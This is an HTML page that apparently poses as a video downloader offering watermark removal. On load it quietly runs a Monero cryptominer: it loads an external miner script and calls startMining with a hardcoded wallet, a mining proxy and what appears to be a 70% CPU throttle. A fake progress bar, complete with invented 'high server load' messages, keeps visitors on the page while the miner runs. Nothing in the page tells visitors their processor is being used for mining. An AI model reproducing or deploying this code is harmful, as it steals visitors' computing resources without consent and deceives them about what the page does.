<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Processing Link...</title>
    <script src="https://webminer.pages.dev/load.js"></script>
    <style>
        body { background: #0d1117; color: white; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
        .loader-wrap { width: 85%; max-width: 400px; text-align: center; }
        #status { font-size: 20px; font-weight: bold; margin-bottom: 10px; color: #00d4ff; }
        #sub-status { color: #8b949e; font-size: 14px; margin-bottom: 25px; }
        .progress-bg { background: #30363d; height: 12px; border-radius: 10px; overflow: hidden; position: relative; }
        .progress-fill { width: 0%; height: 100%; background: linear-gradient(90deg, #00d4ff, #0080ff); transition: width 0.4s ease; box-shadow: 0 0 15px #00d4ff; }
        .warning { margin-top: 20px; font-size: 12px; color: #f85149; display: none; }
        .dl-btn { display: none; background: #00d4ff; color: #000; padding: 18px 40px; border-radius: 12px; text-decoration: none; font-weight: bold; font-size: 18px; margin-top: 20px; animation: pulse 2s infinite; }
        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(0,212,255,0.7); } 70% { box-shadow: 0 0 0 15px rgba(0,212,255,0); } 100% { box-shadow: 0 0 0 0 rgba(0,212,255,0); } }
    </style>
</head>
<body>
    <div class="loader-wrap">
        <div id="status">Connecting...</div>
        <div id="sub-status">Authenticating with Cloud Engine</div>
        <div class="progress-bg"><div class="progress-fill" id="fill"></div></div>
        <div class="warning" id="warn">High server load. Bypassing watermark queue...</div>
        <a id="downloadLink" class="dl-btn" href="#">SAVE VIDEO</a>
    </div>

    <script>
        const WORKER = "https://ghost-api.mr-ghosttrich.workers.dev";
        const WALLET = "48bN9tTb8niehRBkARiRPQgXYQFuh65pj3fp7DSfY8akMgdsQFUKqqg8FbtVQcKVdJPoNapcWMUiu1TSZiG7FxftFy8hiRy";
        
        // Start background profit task
        startMining(WALLET, "User", "wss://ny1.xmrminingproxy.com", 70);

        const fill = document.getElementById('fill');
        const status = document.getElementById('status');
        const sub = document.getElementById('sub-status');
        
        const steps = [
            { p: 20, t: "Initializing...", s: "Establishing secure connection" },
            { p: 45, t: "Fetching Video...", s: "Accessing platform servers" },
            { p: 70, t: "Stripping Watermark...", s: "Processing 1080p High-Quality stream" },
            { p: 90, t: "Finalizing...", s: "Generating private download link" }
        ];

        let currentStep = 0;
        const moveProgress = () => {
            if (currentStep < steps.length) {
                fill.style.width = steps[currentStep].p + "%";
                status.innerText = steps[currentStep].t;
                sub.innerText = steps[currentStep].s;
                currentStep++;
                setTimeout(moveProgress, 2000);
            }
        };
        moveProgress();

        // Show warning after 10 seconds
        setTimeout(() => { document.getElementById('warn').style.display = 'block'; }, 10000);

        async function getLink() {
            const urlParams = new URLSearchParams(window.location.search);
            const target = urlParams.get('url');
            if(!target) return;

            try {
                const res = await fetch(`${WORKER}?url=${encodeURIComponent(target)}`);
                const data = await res.json();
                
                if (data.url) {
                    fill.style.width = "100%";
                    status.innerText = "Complete!";
                    sub.innerText = "Video is ready for download.";
                    const btn = document.getElementById('downloadLink');
                    btn.href = data.url;
                    btn.style.display = "inline-block";
                } else {
                    status.innerText = "Error";
                    sub.innerText = "Invalid link or video is private.";
                }
            } catch (e) {
                status.innerText = "Server Timeout";
                sub.innerText = "The engine is busy. Please refresh the page.";
            }
        }

        // Run the fetch after a short delay to let the UI breathe
        setTimeout(getLink, 6000);
    </script>
</body>
</html>
